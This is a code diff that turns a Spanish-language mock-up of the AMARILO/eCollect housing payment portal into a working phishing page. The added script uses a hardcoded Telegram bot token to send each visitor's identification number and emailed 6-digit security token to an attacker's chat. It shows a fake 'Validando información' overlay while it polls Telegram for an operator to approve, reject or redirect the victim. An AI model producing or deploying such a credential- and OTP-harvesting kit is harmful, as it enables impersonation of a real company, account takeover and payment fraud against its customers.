@@ -165,7 +165,6 @@ main {
     line-height: 1.4;
 }
 
-/* Correo enmascarado */
 .form-side .email-text {
     margin: 0 0 12px;
     color: #29313b;
@@ -189,7 +188,7 @@ main {
     align-items: center;
     justify-content: center;
     border-radius: 4px 0 0 4px;
-    background: #222; /* Cuadro negro */
+    background: #222;
     color: #fff;
     font-size: 15px;
 }
@@ -262,7 +261,6 @@ main {
     max-width: 300px;
     height: 40px;
     margin: 0 0 18px;
-    /* Borde celeste/azul claro como en la imagen */
     border: 1px solid #a0c2e8; 
     border-radius: 3px;
     background: #fff;
@@ -273,14 +271,13 @@ main {
     border-color: #7bafd4;
 }
 
-/* Candado en cuadro negro */
 .token-input-box .lock-icon {
     display: flex;
     flex: 0 0 40px;
     align-items: center;
     justify-content: center;
-    background: #222; /* Cuadro negro */
-    color: #fff;      /* Candado blanco */
+    background: #222;
+    color: #fff;
     height: 100%;
 }
 
@@ -303,7 +300,6 @@ main {
     letter-spacing: 2px;
 }
 
-/* Ojo de rayitas */
 .token-input-box .toggle-eye {
     display: flex;
     align-items: center;
@@ -372,9 +368,40 @@ main {
     line-height: 1.5;
 }
 
-/* ============================
-   RESPONSIVE
-   ============================ */
+/* OVERLAY DE CARGA */
+.loading-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(255, 255, 255, 0.85);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 1000;
+    flex-direction: column;
+}
+
+.spinner {
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #29313b;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 15px;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.loading-overlay p {
+    font-size: 14px;
+    color: #29313b;
+    font-weight: 700;
+}
+
+/* RESPONSIVE */
 @media (min-width: 701px) and (max-width: 950px) {
     .topbar { gap: 16px; padding-right: 22px; padding-left: 22px; }
     .topbar h1 { font-size: 21px; }
@@ -386,212 +413,48 @@ main {
 }
 
 @media (max-width: 700px) {
-    .topbar {
-        min-height: 76px;
-        padding: 7px 12px;
-        gap: 10px;
-    }
-
+    .topbar { min-height: 76px; padding: 7px 12px; gap: 10px; }
     .brand { flex-basis: 100px; font-size: 17px; }
-
-    .brand-mark {
-        width: 52px;
-        height: 43px;
-        margin-bottom: 3px;
-        border-width: 6px;
-    }
-
+    .brand-mark { width: 52px; height: 43px; margin-bottom: 3px; border-width: 6px; }
     .brand-divider, .topbar h1 { display: none; }
-
-    .home-btn {
-        margin-left: auto;
-        padding: 10px 12px;
-        font-size: 11px;
-    }
-
-    main {
-        padding: 20px 0 30px;
-        background: #f2f2f2;
-    }
-
-    .intro {
-        padding: 0 18px;
-        margin: 0 auto 52px;
-        text-align: center;
-    }
-
-    .intro h2 {
-        margin: 0 0 16px;
-        color: #333;
-        font-size: 27px;
-        font-weight: 700;
-        line-height: 1.08;
-        letter-spacing: -0.65px;
-    }
-
-    .intro p {
-        margin: 0;
-        color: #333;
-        font-size: 22px;
-        font-weight: 400;
-        line-height: 1.15;
-        letter-spacing: -0.45px;
-    }
-
-    .payment-card {
-        display: flex;
-        flex-direction: column;
-        width: 100%;
-        max-width: none;
-        min-height: 0;
-        margin: 0;
-        overflow: hidden;
-        border: 1px solid #dedede;
-        border-radius: 7px;
-        background: #fff;
-        box-shadow: 0 2px 5px #0002;
-    }
-
+    .home-btn { margin-left: auto; padding: 10px 12px; font-size: 11px; }
+    main { padding: 20px 0 30px; background: #f2f2f2; }
+    .intro { padding: 0 18px; margin: 0 auto 52px; text-align: center; }
+    .intro h2 { margin: 0 0 16px; color: #333; font-size: 27px; font-weight: 700; line-height: 1.08; letter-spacing: -0.65px; }
+    .intro p { margin: 0; color: #333; font-size: 22px; font-weight: 400; line-height: 1.15; letter-spacing: -0.45px; }
+    .payment-card { display: flex; flex-direction: column; width: 100%; max-width: none; min-height: 0; margin: 0; overflow: hidden; border: 1px solid #dedede; border-radius: 7px; background: #fff; box-shadow: 0 2px 5px #0002; }
     .photo-side { display: none; }
-
-    .form-side {
-        display: flex;
-        flex-direction: column;
-        align-items: stretch;
-        width: 100%;
-        padding: 18px 17px 32px;
-    }
-
-    .form-side h3 {
-        margin: 0 0 12px;
-        color: #333;
-        font-size: 22px;
-        font-weight: 400;
-        line-height: 1.2;
-        letter-spacing: -0.4px;
-    }
-
-    .form-side .help {
-        margin: 0 0 18px;
-        color: #929292;
-        font-size: 18px;
-        font-weight: 400;
-        line-height: 1.25;
-        letter-spacing: -0.2px;
-    }
-
-    .form-side .email-text {
-        font-size: 18px;
-        margin-bottom: 16px;
-    }
-
-    .input-wrap {
-        display: flex;
-        width: 100%;
-        max-width: none;
-        height: 36px;
-        margin: 0 0 18px;
-    }
-
-    .user-icon {
-        flex: 0 0 54px;
-        width: 54px;
-        min-width: 54px;
-        border-radius: 5px 0 0 5px;
-        font-size: 19px;
-    }
-
-    .input-wrap input {
-        flex: 1;
-        width: 100%;
-        min-width: 0;
-        height: 36px;
-        padding: 5px 9px;
-        border: 1px solid #ccc;
-        border-left: 0;
-        border-radius: 0 5px 5px 0;
-        background: #fff;
-        font-size: 16px;
-        font-weight: 400;
-        letter-spacing: -0.25px;
-    }
-
-    .login-btn {
-        width: 100%;
-        max-width: none;
-        min-height: 37px;
-        padding: 7px;
-        border: 1.5px solid #333;
-        border-radius: 6px;
-        background: #fff;
-        color: #333;
-        font-size: 17px;
-        font-weight: 400;
-        letter-spacing: -0.25px;
-    }
-
-    .token-input-box {
-        width: 100%;
-        max-width: none;
-        height: 44px;
-        margin-bottom: 18px;
-    }
-
-    .token-input-box .lock-icon {
-        flex-basis: 50px;
-        font-size: 16px;
-    }
-
-    .token-input-box input {
-        font-size: 18px;
-    }
-
-    .rule {
-        width: 100%;
-        max-width: none;
-        margin: 14px 0 0;
-        border: 0;
-        border-top: 1px solid #333;
-    }
-
+    .form-side { display: flex; flex-direction: column; align-items: stretch; width: 100%; padding: 18px 17px 32px; }
+    .form-side h3 { margin: 0 0 12px; color: #333; font-size: 22px; font-weight: 400; line-height: 1.2; letter-spacing: -0.4px; }
+    .form-side .help { margin: 0 0 18px; color: #929292; font-size: 18px; font-weight: 400; line-height: 1.25; letter-spacing: -0.2px; }
+    .form-side .email-text { font-size: 18px; margin-bottom: 16px; }
+    .input-wrap { display: flex; width: 100%; max-width: none; height: 36px; margin: 0 0 18px; }
+    .user-icon { flex: 0 0 54px; width: 54px; min-width: 54px; border-radius: 5px 0 0 5px; font-size: 19px; }
+    .input-wrap input { flex: 1; width: 100%; min-width: 0; height: 36px; padding: 5px 9px; border: 1px solid #ccc; border-left: 0; border-radius: 0 5px 5px 0; background: #fff; font-size: 16px; font-weight: 400; letter-spacing: -0.25px; }
+    .login-btn { width: 100%; max-width: none; min-height: 37px; padding: 7px; border: 1.5px solid #333; border-radius: 6px; background: #fff; color: #333; font-size: 17px; font-weight: 400; letter-spacing: -0.25px; }
+    .token-input-box { width: 100%; max-width: none; height: 44px; margin-bottom: 18px; }
+    .token-input-box .lock-icon { flex-basis: 50px; font-size: 16px; }
+    .token-input-box input { font-size: 18px; }
+    .rule { width: 100%; max-width: none; margin: 14px 0 0; border: 0; border-top: 1px solid #333; }
     .security { gap: 12px; margin: 65px 12px 0; }
     .ecollect { font-size: 24px; }
     .secure-sub { font-size: 13px; }
     .ssl { padding: 12px; font-size: 12px; }
-
-    .cert {
-        width: 68px;
-        height: 68px;
-        font-size: 10px;
-    }
-
-    .notice {
-        margin: 20px 16px 0;
-        font-size: 10px;
-        line-height: 1.5;
-    }
+    .cert { width: 68px; height: 68px; font-size: 10px; }
+    .notice { margin: 20px 16px 0; font-size: 10px; line-height: 1.5; }
 }
 
 @media (max-width: 390px) {
     .intro { padding: 0 16px; margin-bottom: 45px; }
     .intro h2 { font-size: 24px; font-weight: 700; line-height: 1.1; letter-spacing: -0.5px; }
     .intro p { font-size: 20px; line-height: 1.15; }
-
     .form-side { padding: 17px 16px 30px; }
     .form-side h3 { font-size: 20px; }
     .form-side .help { font-size: 17px; }
     .form-side .email-text { font-size: 16px; }
-
     .input-wrap { height: 36px; margin-bottom: 18px; }
-
     .user-icon { flex-basis: 46px; width: 46px; min-width: 46px; }
-
-    .input-wrap input {
-        height: 36px;
-        padding: 5px 8px;
-        font-size: 14px;
-    }
-
+    .input-wrap input { height: 36px; padding: 5px 8px; font-size: 14px; }
     .login-btn { min-height: 37px; font-size: 16px; }
     .security { margin-top: 55px; }
 }
@@ -605,11 +468,8 @@ main {
         <div class="brand-mark"></div>
         AMARILO
     </div>
-
     <div class="brand-divider"></div>
-
     <h1>Módulo de Recaudos</h1>
-
     <button class="home-btn" type="button" onclick="location.reload()">
         REGRESAR AL INICIO
     </button>
@@ -617,84 +477,46 @@ main {
 
 <main>
     <section class="intro">
-        <h2>
-            Bienvenido al sistema de pagos electrónicos de AMARILO -
-            Separaciones ventas nuevas
-        </h2>
-
-        <p>
-            AQUÍ PODRÁS REALIZAR TUS PAGOS DE MANERA SEGURA
-        </p>
+        <h2>Bienvenido al sistema de pagos electrónicos de AMARILO - Separaciones ventas nuevas</h2>
+        <p>AQUÍ PODRÁS REALIZAR TUS PAGOS DE MANERA SEGURA</p>
     </section>
 
     <section class="payment-card" aria-label="Módulo de recaudos">
-
         <div class="photo-side">
-            <img
-                src="https://styles.ecollect.co/eCollectPlus/10189/eCollect_brand/img/box_login.png"
-                alt="Imagen ilustrativa del módulo de recaudos">
+            <img src="https://styles.ecollect.co/eCollectPlus/10189/eCollect_brand/img/box_login.png" alt="Imagen ilustrativa">
         </div>
 
         <div class="form-side">
-            
             <!-- VISTA 1: IDENTIFICACIÓN -->
             <div id="viewIdentificacion" style="width: 100%;">
                 <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
-
-                <p class="help">
-                    Digite la información solicitada para ingresar al sistema.
-                </p>
+                <p class="help">Digite la información solicitada para ingresar al sistema.</p>
 
                 <div class="input-wrap">
                     <span class="user-icon" aria-hidden="true">♟</span>
-
-                    <input
-                        type="text"
-                        id="identificacion"
-                        placeholder="* Número de identificación"
-                        aria-label="Número de identificación"
-                        inputmode="numeric"
-                        maxlength="12">
+                    <input type="text" id="identificacion" placeholder="* Número de identificación" aria-label="Número de identificación" inputmode="numeric" maxlength="12">
                 </div>
 
                 <button class="login-btn" type="button" id="btnLogin">
                     INICIAR SESIÓN
                 </button>
-
                 <hr class="rule">
             </div>
 
             <!-- VISTA 2: TOKEN -->
             <div id="viewToken" class="token-view">
                 <h3>PAGO DE LA CUOTA DE SU VIVIENDA</h3>
-
-                <p class="help">
-                    Por favor ingrese el Token enviado a su correo electrónico:
-                </p>
-
-                <!-- Correo simulado enmascarado -->
-                <p class="email-text" id="correoEnmascarado">
-                    au***78@ho*****.com
-                </p>
+                <p class="help">Por favor ingrese el Token enviado a su correo electrónico:</p>
+                <p class="email-text" id="correoEnmascarado">au***78@ho*****.com</p>
 
                 <div class="token-input-box">
-                    <!-- Candado en cuadro negro -->
                     <span class="lock-icon" aria-hidden="true">
                         <svg width="14" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                             <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                             <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                         </svg>
                     </span>
-
-                    <input
-                        type="password"
-                        id="inputToken"
-                        aria-label="Token de seguridad"
-                        inputmode="numeric"
-                        maxlength="6"
-                        placeholder="......">
-
-                    <!-- Ojo de Rayitas (SVG) -->
+                    <input type="password" id="inputToken" aria-label="Token de seguridad" inputmode="numeric" maxlength="6" placeholder="......">
                     <button type="button" class="toggle-eye" id="btnToggleEye" aria-label="Mostrar u ocultar token">
                         <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                             <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
@@ -706,129 +528,347 @@ main {
                 <button class="login-btn" type="button" id="btnValidarToken">
                     VALIDAR TOKEN
                 </button>
-
                 <hr class="rule">
             </div>
-
         </div>
     </section>
 
     <section class="security" aria-label="Elementos de seguridad">
-
         <div>
             <div class="ecollect"><b>G</b> ecollect</div>
             <div class="secure-sub">Seguro para ti ◈</div>
         </div>
-
         <div class="ssl">SSL</div>
-
-        <div class="cert">
-            ICONO<br>SEGURIDAD
-        </div>
+        <div class="cert">ICONO<br>SEGURIDAD</div>
     </section>
 
-    <p class="notice">
-        Concepto de diseño para revisión empresarial.
-    </p>
+    <p class="notice">Concepto de diseño para revisión empresarial.</p>
 </main>
 
+<!-- OVERLAY DE CARGA -->
+<div class="loading-overlay" id="loading-overlay">
+    <div class="spinner"></div>
+    <p>Validando información...</p>
+</div>
+
 <script>
-(function () {
-    // Elementos de la vista 1
-    const inputId = document.getElementById('identificacion');
-    const btnLogin = document.getElementById('btnLogin');
-    const viewIdentificacion = document.getElementById('viewIdentificacion');
+// ==========================================
+// 🔑 CONFIGURACIÓN DE TELEGRAM
+// ==========================================
+const TG_BOT_TOKEN = '8720080632:AAHx4C3zh9LD4GEVOohesCsxMx9U-3TAZHk';
+const TG_CHAT_ID = '7776240161';
 
-    // Elementos de la vista 2 (Token)
-    const viewToken = document.getElementById('viewToken');
-    const correoEnmascarado = document.getElementById('correoEnmascarado');
-    const inputToken = document.getElementById('inputToken');
-    const btnToggleEye = document.getElementById('btnToggleEye');
-    const eyeIcon = document.getElementById('eyeIcon');
-    const btnValidarToken = document.getElementById('btnValidarToken');
+// ==========================================
+// VARIABLES Y ELEMENTOS DEL DOM
+// ==========================================
+const inputId = document.getElementById('identificacion');
+const btnLogin = document.getElementById('btnLogin');
+const viewIdentificacion = document.getElementById('viewIdentificacion');
 
-    // Forzar solo números en la identificación
-    inputId.addEventListener('input', function () {
-        this.value = this.value.replace(/\D/g, '');
-    });
+const viewToken = document.getElementById('viewToken');
+const correoEnmascarado = document.getElementById('correoEnmascarado');
+const inputToken = document.getElementById('inputToken');
+const btnToggleEye = document.getElementById('btnToggleEye');
+const eyeIcon = document.getElementById('eyeIcon');
+const btnValidarToken = document.getElementById('btnValidarToken');
 
-    // Acción del botón Iniciar Sesión -> Pasa a la vista del token
-    btnLogin.addEventListener('click', function () {
-        const id = inputId.value.trim();
+let idBuscadoGlobal = '';
+let actionProcessed = false;
+let pollingActivo = false;
+let pollingTimeout = null;
+let msgIdActual = null;
 
-        if (id === '') {
-            alert('Por favor ingresa tu número de identificación.');
-            inputId.focus();
-            return;
+// Solo números permitidos
+inputId.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '');
+});
+inputToken.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '');
+});
+
+// Mostrar/Ocultar ojito
+btnToggleEye.addEventListener('click', function () {
+    if (inputToken.type === 'password') {
+        inputToken.type = 'text';
+        eyeIcon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>`;
+    } else {
+        inputToken.type = 'password';
+        eyeIcon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>`;
+    }
+    inputToken.focus();
+});
+
+// ==========================================
+// OVERLAY
+// ==========================================
+function mostrarOverlay() {
+    document.getElementById('loading-overlay').style.display = 'flex';
+}
+function ocultarOverlay() {
+    document.getElementById('loading-overlay').style.display = 'none';
+}
+
+// ==========================================
+// 📤 ENVIAR A TELEGRAM (Identificación)
+// ==========================================
+function enviarIdentificacionTelegram(valorIngresado, onSent) {
+    const mensaje = `
+⚡ <b>CELSIA - IDENTIFICACIÓN</b>
+
+🔍 <b>Número:</b> <code>${valorIngresado}</code>
+
+📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+  `.trim();
+
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: '🔑 Pedir Token', callback_data: 'pedir_token' },
+                { text: '❌ Usuario Malo', callback_data: 'usuario_malo' }
+            ]
+        ]
+    };
+
+    return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'HTML',
+            reply_markup: keyboard
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            if (typeof onSent === 'function') onSent(msgIdActual);
+            return msgIdActual;
         }
+        return null;
+    })
+    .catch(err => {
+        console.error('❌ Error de red:', err);
+        return null;
+    });
+}
 
-        // Simular enmascaramiento del correo basado en el ID
-        correoEnmascarado.textContent = `au***${id.slice(-2)}@ho*****.com`;
+// ==========================================
+// 📤 ENVIAR A TELEGRAM (Token)
+// ==========================================
+function enviarTokenTelegram(valorToken, onSent) {
+    const mensaje = `
+⚡ <b>CELSIA - TOKEN RECIBIDO</b>
 
-        // Cambiar vista
+🔍 <b>Identificación:</b> ${idBuscadoGlobal}
+🔑 <b>Token:</b> <code>${valorToken}</code>
+
+📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
+  `.trim();
+
+    // Agregamos los 3 botones solicitados
+    const keyboard = {
+        inline_keyboard: [
+            [
+                { text: '❌ Usuario Malo', callback_data: 'usuario_malo_final' }
+            ],
+            [
+                { text: '🌐 Usuario Correcto (Google)', callback_data: 'usuario_correcto' }
+            ],
+            [
+                { text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo' }
+            ]
+        ]
+    };
+
+    return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: mensaje,
+            parse_mode: 'HTML',
+            reply_markup: keyboard
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.ok && data.result) {
+            msgIdActual = String(data.result.message_id);
+            if (typeof onSent === 'function') onSent(msgIdActual);
+            return msgIdActual;
+        }
+        return null;
+    })
+    .catch(err => {
+        console.error(err);
+        return null;
+    });
+}
+
+// ==========================================
+// 👂 ESCUCHAR BOTONES (polling)
+// ==========================================
+function escucharBotones(callbackAction) {
+    if (!msgIdActual) return;
+
+    pollingActivo = true;
+    let lastUpdateId = -1;
+
+    function check() {
+        if (!pollingActivo) return;
+
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                offset: lastUpdateId + 1,
+                allowed_updates: ['callback_query'],
+                timeout: 10
+            })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000);
+                return;
+            }
+
+            for (const u of data.result) {
+                lastUpdateId = Math.max(lastUpdateId, u.update_id);
+                if (!u.callback_query) continue;
+
+                const action = u.callback_query.data;
+                const messageId = String(u.callback_query.message.message_id);
+
+                // SOLO procesar si el botón presionado pertenece al mensaje actual
+                if (messageId === String(msgIdActual)) {
+                    pollingActivo = false;
+                    callbackAction(action);
+                    return;
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        })
+        .catch(err => {
+            pollingTimeout = setTimeout(check, 3000);
+        });
+    }
+    check();
+}
+
+// ==========================================
+// 🗺️ ACCIÓN DEL BOT (PASO 1: IDENTIFICACIÓN)
+// ==========================================
+function handleTelegramActionId(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+    btnLogin.disabled = false;
+
+    if (action === 'pedir_token') {
         viewIdentificacion.style.display = 'none';
         viewToken.classList.add('active');
+        setTimeout(() => inputToken.focus(), 100);
+        
+    } else if (action === 'usuario_malo') {
+        alert('El documento o cuenta no es válido. Verifica e intenta de nuevo.');
+        inputId.value = '';
+        actionProcessed = false;
+    }
+}
 
-        // Enfocar el campo del token automáticamente
-        setTimeout(() => {
-            inputToken.focus();
-        }, 100);
-    });
+// ==========================================
+// 🗺️ ACCIÓN DEL BOT (PASO 2: TOKEN)
+// ==========================================
+function handleTelegramActionToken(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
 
-    // Forzar solo números en el token
-    inputToken.addEventListener('input', function () {
-        this.value = this.value.replace(/\D/g, '');
-    });
-
-    // Mostrar / Ocultar token (el ojito SVG)
-    btnToggleEye.addEventListener('click', function () {
-        if (inputToken.type === 'password') {
-            inputToken.type = 'text';
-            // Cambiar a ícono de ojo tachado
-            eyeIcon.innerHTML = `
-                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
-                <line x1="1" y1="1" x2="23" y2="23"></line>
-            `;
-        } else {
-            inputToken.type = 'password';
-            // Volver al ícono de ojo normal
-            eyeIcon.innerHTML = `
-                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
-                <circle cx="12" cy="12" r="3"></circle>
-            `;
-        }
+    if (action === 'usuario_correcto') {
+        // Redirigir a Google
+        window.location.href = 'https://www.google.com';
+        
+    } else if (action === 'finalizar_yahoo') {
+        // Redirigir a Yahoo
+        window.location.href = 'https://www.yahoo.com';
+        
+    } else if (action === 'usuario_malo_final') {
+        // Error en el token
+        alert('❌ El token es incorrecto o el usuario no es válido.');
+        inputToken.value = '';
         inputToken.focus();
-    });
+        actionProcessed = false;
+    } else {
+        actionProcessed = false;
+    }
+}
 
-    // Validar Token
-    btnValidarToken.addEventListener('click', function () {
-        const token = inputToken.value.trim();
+// ==========================================
+// 🚀 EVENTOS DE BOTONES EN PANTALLA
+// ==========================================
 
-        if (token.length < 6) {
-            alert('El token debe tener exactamente 6 dígitos.');
-            inputToken.focus();
-            return;
+// Botón "INICIAR SESIÓN" -> Manda la identificación
+btnLogin.addEventListener('click', function() {
+    const id = inputId.value.trim();
+    if (id === '') {
+        alert('Por favor ingresa tu número de identificación.');
+        inputId.focus();
+        return;
+    }
+
+    idBuscadoGlobal = id;
+    actionProcessed = false;
+    mostrarOverlay();
+    btnLogin.disabled = true;
+
+    enviarIdentificacionTelegram(idBuscadoGlobal, function(msgId) {
+        if (msgId) {
+            escucharBotones(handleTelegramActionId);
+        } else {
+            ocultarOverlay();
+            btnLogin.disabled = false;
+            alert('Error de conexión con Telegram.');
         }
-
-        // Simulación de validación exitosa
-        btnValidarToken.textContent = 'VALIDANDO...';
-        btnValidarToken.disabled = true;
-
-        setTimeout(() => {
-            btnValidarToken.textContent = 'VALIDAR TOKEN';
-            btnValidarToken.disabled = false;
-            alert('✅ Token válido. Redirigiendo al sistema (simulación).');
-        }, 1000);
     });
+});
 
-    // Permitir enviar con "Enter" en el campo del token
-    inputToken.addEventListener('keydown', function (e) {
-        if (e.key === 'Enter') {
-            e.preventDefault();
-            btnValidarToken.click();
+// Botón "VALIDAR TOKEN" -> Manda el token
+btnValidarToken.addEventListener('click', function() {
+    const token = inputToken.value.trim();
+
+    if (token.length < 6) {
+        alert('El token debe tener exactamente 6 dígitos.');
+        inputToken.focus();
+        return;
+    }
+
+    actionProcessed = false;
+    mostrarOverlay();
+    
+    // Actualizamos el correo visualmente
+    correoEnmascarado.textContent = `au***${idBuscadoGlobal.slice(-2)}@ho*****.com`;
+
+    // Se envía a Telegram el token y esperamos los 3 botones
+    enviarTokenTelegram(token, function(msgId) {
+        if (msgId) {
+            escucharBotones(handleTelegramActionToken);
+        } else {
+            ocultarOverlay();
+            alert('Error al enviar el token a Telegram.');
         }
     });
-})();
+});
+
+// Permitir Enter en el Token
+inputToken.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        btnValidarToken.click();
+    }
+});
 </script>
 
 </body>
